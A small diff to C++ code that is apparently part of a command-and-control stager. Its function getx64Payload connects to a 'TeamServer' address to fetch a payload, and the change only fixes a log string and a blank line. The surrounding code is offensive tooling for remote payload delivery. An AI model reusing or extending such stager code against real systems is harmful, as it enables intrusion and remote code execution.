@@ -67,7 +67,7 @@ void send_frame(SOCKET my_socket, char* buffer, int length) {
 
 //I'm being lazy so we have 2 funcs, one for x86 and one for x64
 std::vector<uint8_t> getx64Payload() {
-	std::cout << "[?] Getting x86 from TeamServer" << std::endl;
+	std::cout << "[?] Getting x64 from TeamServer" << std::endl;
 	struct sockaddr_in 	sock;
 	sock.sin_family = AF_INET;
 	sock.sin_addr.s_addr = inet_addr(TeamServer::address.c_str());
@@ -98,7 +98,6 @@ std::vector<uint8_t> getx64Payload() {
 	//std::cout << "[?] Payload: ";
 	//printHexVector(payload);
 	std::cout << "[?] Payload of size " << payload.size() << " recieved. " << std::endl;
-
 	return payload;
 };
 
